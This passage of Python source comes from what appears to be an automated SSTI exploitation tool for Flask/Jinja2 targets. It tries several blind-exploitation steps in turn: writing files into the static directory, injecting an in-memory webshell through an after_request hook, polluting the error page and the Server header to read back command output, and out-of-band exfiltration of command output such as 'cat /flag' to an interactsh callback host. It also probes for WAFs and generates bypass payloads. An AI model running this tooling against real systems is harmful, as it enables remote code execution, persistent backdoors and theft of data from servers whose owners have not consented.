            bool: 是否成功
        """
        probe = self.http_get(self.url)
        server_header = probe.headers.get("Server", "") if probe is not None else ""
        if "werkzeug" not in server_header.lower():
            logger.info(
                "[yellow]目标Server头 [blue]%s[/] 不含Werkzeug字样，"
                "非Werkzeug开发服务器，跳过Server头污染步骤[/]",
                rich_escape(server_header or "(空)"),
                extra={"markup": True, "highlighter": None},
            )
            return False
        for name, raw_template in SERVERHEADER_RAW_VARIANTS:
            canary = gen_canary()
            logger.info(
                "尝试Server头污染方式: [blue]%s[/]",
                name,
                extra={"markup": True, "highlighter": None},
            )
            py_code = SERVERHEADER_PY.replace("<CANARY>", canary)
            raw_payload = raw_template.replace("<CANARY>", canary)
            if not self.submit_payload(self.gen_payload(py_code, raw_payload)):
                continue

            def check():
                resp = self.http_get(self.url)
                return resp is not None and canary in resp.headers.get("Server", "")

            if self.verify_loop(check, "Server头污染验证"):
                self.last_canary = canary
                self.results["canary"] = canary
                self.results["steps"]["server_header"] = {"variant": name}
                logger.info(
                    "[green bold]Server头污染成功！[/] Server头: [cyan]%s[/]",
                    rich_escape(canary),
                    extra={"markup": True, "highlighter": None},
                )
                return True
        return False

    def restore_server_header(self) -> bool:
        """还原Server头污染：把_fj_orig中的原server_version写回

        Returns:
            bool: 是否还原成功
        """
        ok = self.submit_payload(
            self.gen_payload(SERVERHEADER_RESTORE_PY, SERVERHEADER_RESTORE_RAW)
        )
        if ok:
            resp = self.http_get(self.url)
            server_header = resp.headers.get("Server", "") if resp is not None else ""
            if "werkzeug" in server_header.lower():
                logger.info(
                    "[green]Server头已还原为 [blue]%s[/][/]",
                    rich_escape(server_header),
                    extra={"markup": True, "highlighter": None},
                )
                return True
        logger.warning(
            "[yellow]Server头还原未能确认，请重启目标应用手动清理[/]",
            extra={"markup": True, "highlighter": None},
        )
        return False

    # ---------------- 第5步：OOB带外 ----------------

    def step_oob(
        self,
        callback: str = "",
        oob_server: str = "",
        oob_cmd: str = "cat /flag",
        oob_timeout: int = 30,
    ) -> bool:
        """第5步：OOB带外

        给了oob_server时对接self-hosted interactsh：自动/register拿子域名，
        逐个发送payload变体并/poll轮询确认，拿到交互记录后解码展示带出的数据；
        只给callback时发送payload后提示用户去client端查看，无法自动验证。

        Args:
            callback (str): 用户提供的回调地址（如interactsh分配的子域名）
            oob_server (str): self-hosted interactsh服务器域名
            oob_cmd (str): 要带出数据的命令
            oob_timeout (int): 每个payload变体的轮询等待秒数

        Returns:
            bool: 是否确认带出数据（手动callback模式只表示payload已发送）
        """
        from .interactsh import InteractshClient, InteractshError  # 避免无谓加载

        client = None
        if oob_server:
            try:
                client = InteractshClient(oob_server, timeout=self.timeout)
                addr = client.register()
            except InteractshError as e:
                logger.error(
                    "[red]interactsh注册失败: %s[/]",
                    rich_escape(str(e)),
                    extra={"markup": True, "highlighter": None},
                )
                return False
            self.results["oob"]["server"] = oob_server
            self.results["oob"]["domain"] = addr
        elif callback:
            addr = callback.strip().removeprefix("http://").removeprefix("https://")
            addr = addr.strip("/")
        else:
            return False

        variants = build_oob_payloads(addr, oob_cmd)
        try:
            for name, py_code, raw_payload in variants:
                logger.info(
                    "尝试OOB方式: [blue]%s[/]",
                    name,
                    extra={"markup": True, "highlighter": None},
                )
                if not self.submit_payload(self.gen_payload(py_code, raw_payload)):
                    continue
                if client is None:
                    logger.info(
                        "[yellow]OOB payload已发送，目标执行后会请求 "
                        "[blue]http://%s/[/]，此步无法自动验证，"
                        "请到interactsh-client等client端查看是否有请求记录[/]",
                        rich_escape(addr),
                        extra={"markup": True, "highlighter": None},
                    )
                    return True
                data = self._poll_oob(client, oob_timeout)
                if data is not None:
                    self.results["oob"]["exfiltrated"] = data
                    logger.info(
                        "[green bold]OOB带外成功！带出的数据：[/]\n[cyan]%s[/]",
                        rich_escape(data),
                        extra={"markup": True, "highlighter": None},
                    )
                    return True
                logger.info(
                    "[yellow]该方式%d秒内未收到回调，尝试下一种...[/]",
                    oob_timeout,
                    extra={"markup": True, "highlighter": None},
                )
            return False
        finally:
            if client is not None and client.correlation_id:
                client.deregister()

    def _poll_oob(self, client, oob_timeout: int) -> Union[str, None]:
        """轮询interactsh直到拿到交互记录，解码并返回带出的数据

        Args:
            client: InteractshClient实例
            oob_timeout (int): 轮询等待秒数

        Returns:
            Union[str, None]: 带出的数据，超时为None
        """
        from .interactsh import InteractshError

        deadline = time.time() + oob_timeout
        while time.time() < deadline:
            time.sleep(3)
            try:
                interactions = client.poll()
            except InteractshError as e:
                logger.warning("poll失败: %s", e, extra={"highlighter": None})
                continue
            if not interactions:
                continue
            self.results["oob"]["interactions"] = interactions
            logger.info(
                "[green]收到%d条OOB交互记录[/]",
                len(interactions),
                extra={"markup": True, "highlighter": None},
            )
            for item in interactions:
                logger.info(
                    "  protocol=[cyan]%s[/] remote=[blue]%s[/] time=%s",
                    item.get("protocol", "?"),
                    item.get("remote-address", "?"),
                    item.get("timestamp", "?"),
                    extra={"markup": True, "highlighter": None},
                )
                data = self._extract_oob_data(item)
                if data is not None:
                    return data
            # 有交互但没能解码出数据，也视为确认（盲打已实锤）
            return "(已确认OOB交互，但未能从请求中解码出数据)"
        return None

    @staticmethod
    def _extract_oob_data(item: dict) -> Union[str, None]:
        """从交互记录中解码带出的数据：HTTP路径里的base64或DNS子域名里的hex

        Args:
            item (dict): 解密后的交互记录

        Returns:
            Union[str, None]: 解码出的数据
        """
        raw = item.get("raw-request", "") or ""
        if item.get("protocol") == "dns":
            # qname首标签为hex编码的数据
            match = re.search(r"\b([0-9a-fA-F]{8,60})\.", raw)
            if match:
                try:
                    return bytes.fromhex(match.group(1)).decode(errors="replace")
                except ValueError:
                    return None
            return None
        # http：路径第一段是base64
        match = re.search(r"GET /([A-Za-z0-9+/=]+)", raw)
        if match:
            try:
                return base64.b64decode(match.group(1)).decode(errors="replace")
            except Exception:  # pylint: disable=broad-except
                return None
        return None

    # ---------------- 主流程 ----------------

    def run(
        self,
        interactive: bool = True,
        do_oob: bool = True,
        oob_callback: str = "",
        oob_server: str = "",
        oob_cmd: str = "cat /flag",
        oob_timeout: int = 30,
    ) -> str:
        """按顺序自动尝试所有利用步骤，某步验证成功即停下并进入对应的使用模式

        Args:
            interactive (bool): 成功后是否进入交互shell
            do_oob (bool): 前4步都失败后是否尝试OOB
            oob_callback (str): OOB手动回调地址，与oob_server二选一
            oob_server (str): self-hosted interactsh服务器域名，自动注册轮询
            oob_cmd (str): OOB带外执行的命令
            oob_timeout (int): OOB每个payload变体的轮询等待秒数

        Returns:
            str: 成功的步骤名，全部失败则返回空字符串
        """
        console.rule("[cyan bold]第0步：模板引擎指纹探测[/]")
        self.probe_engine()

        console.rule("[cyan bold]第1步：写文件到static目录[/]")
        if self.step_write_static():
            console.print(
                "[green]之后可用同法写入任意命令输出"
                "（如把os.popen结果写入static下的文件再访问），或直接写入webshell内容文件；"
                "canary文件已自动删除[/]"
            )
            return "write_static"

        console.rule("[cyan bold]第2步：注入内存马（Flask after_request钩子）[/]")
        if self.step_memory_shell():
            if interactive:
                self.memshell_loop()
            else:
                console.print(
                    "[yellow]内存马保持注入状态，用完后请访问 "
                    f"{self.url}?fjunhook=1 卸载（多worker目标需重复），或重启目标应用[/]"
                )
            return "memory_shell"

        console.rule("[cyan bold]第3步：错误页污染回显[/]")
        if self.step_error_page():
            if interactive:
                self.errorpage_loop()
            else:
                self.restore_error_page()
            return "error_page"

        console.rule("[cyan bold]第4步：Server头回显[/]")
        if self.step_server_header():
            console.print(
                "[yellow]注意：Server头方式只能输出单行内容，"
                "可把命令输出base64或截断后塞进server_version[/]"
            )
            self.restore_server_header()
            return "server_header"

        if do_oob:
            console.rule("[cyan bold]第5步：OOB带外[/]")
            callback, server = oob_callback, oob_server
            if not callback and not server and interactive:
                console.print(
                    "如果有self-hosted interactsh服务器，请输入其域名（如 oob.zemu137.online），"
                    "将自动注册轮询验证；或输入已在别处起的interactsh-client分配的子域名"
                    "（手动模式，不自动验证）；留空跳过"
                )
                try:
                    answer = console.input("[bold yellow]OOB地址> [/]").strip()
                except (EOFError, KeyboardInterrupt):
                    answer = ""
                if answer:
                    # 形如xxx.oob.xxx.com的视为手动回调子域名，否则视为interactsh服务器
                    if answer.count(".") >= 3:
                        callback = answer
                    else:
                        server = answer
            if callback or server:
                if self.step_oob(
                    callback=callback,
                    oob_server=server,
                    oob_cmd=oob_cmd,
                    oob_timeout=oob_timeout,
                ):
                    return "oob"

        console.print("[red bold]所有步骤均失败，目标可能不存在SSTI或环境不支持[/]")
        console.print("[yellow]以下假设可能不成立，请逐一排查：[/]")
        console.print("- 目标模板引擎非Jinja2（指纹探测结果: " +
                      json.dumps(self.results["fingerprint"], ensure_ascii=False) + "）")
        console.print("- 目标非Flask/Werkzeug框架（内存马/错误页/Server头步骤均依赖）")
        console.print("- 目标无法执行os.popen或命令执行被限制")
        console.print("- payload被WAF拦截，且目标无回显无法探测WAF规则")
        console.print("- 静态目录不可写或不挂在/static/（可用--static-path指定实际挂载点）")
        return ""


def run_blind(
    url: str,
    form: Form,
    input_field: str,
    requester: HTTPRequester,
    options: Options,
    tamper_cmd: str = "",
    interactive: bool = True,
    do_oob: bool = True,
    oob_callback: str = "",
    oob_server: str = "",
    oob_cmd: str = "cat /flag",
    oob_timeout: int = 30,
    static_path: str = "",
    output: str = "",
) -> str:
    """无回显利用的入口：先按现有流程尝试WAF探测，然后逐步自动利用

    Args:
        url (str): 目标URL
        form (Form): 目标表单
        input_field (str): 注入的参数字段
        requester (HTTPRequester): 发送请求的requester
        options (Options): 攻击选项
        tamper_cmd (str): tamper命令
        interactive (bool): 成功后是否进入交互shell
        do_oob (bool): 前4步都失败后是否尝试OOB
        oob_callback (str): OOB手动回调地址
        oob_server (str): self-hosted interactsh服务器域名，自动注册轮询
        oob_cmd (str): OOB带外执行的命令
        oob_timeout (int): OOB每个payload变体的轮询等待秒数
        static_path (str): 非默认/static/挂载时的静态文件URL前缀
        output (str): 把结构化结果写入该JSON文件，为空则不写

    Returns:
        str: 成功的步骤名，全部失败则返回空字符串
    """
    submitter: Submitter = FormSubmitter(url, form, input_field, requester)
    if tamper_cmd:
        submitter.add_tamperer(shell_tamperer(tamper_cmd))

    # 先按现有流程做WAF探测拿到full_payload_gen，目标无回显时这里会失败
    full_payload_gen = None
    logger.info(
        "[yellow]先按现有流程探测WAF（需要目标有回显，无回显时会自动跳过）...[/]",
        extra={"markup": True, "highlighter": None},
    )
    from .job import Job, FormCrackContext  # 避免循环import

    context = FormCrackContext(
        url=url,
        form=form,
        requester=requester,
        options=options,
        tamper_cmd=tamper_cmd or None,
    )
    job = Job(context)
    try:
        with pbar_manager.progress:
            ok = job.do_crack_pre()
    except Exception as e:  # pylint: disable=broad-except
        logger.warning("WAF探测失败: %s", e, extra={"highlighter": None})
        ok = False
    if ok and job.payload_generator is not None and job.submitter is not None:
        full_payload_gen = job.payload_generator
        submitter = job.submitter
        logger.info(
            "[green]WAF探测成功，固定payload将生成绕过版本[/]",
            extra={"markup": True, "highlighter": None},
        )
    else:
        logger.info(
            "[yellow]目标无回显，无法探测WAF，将直接发送原始payload[/]",
            extra={"markup": True, "highlighter": None},
        )

    attacker = BlindAttacker(
        url, submitter, full_payload_gen, requester=requester, static_path=static_path
    )
    step = attacker.run(
        interactive=interactive,
        do_oob=do_oob,
        oob_callback=oob_callback,
        oob_server=oob_server,
        oob_cmd=oob_cmd,
        oob_timeout=oob_timeout,
    )
    attacker.results["success_step"] = step
    if output:
        Path(output).write_text(
            json.dumps(attacker.results, ensure_ascii=False, indent=2),
            encoding="utf-8",
        )
        logger.info(
            "[green]结果已保存到 [blue]%s[/][/]",
            rich_escape(output),
            extra={"markup": True, "highlighter": None},
        )
    return step
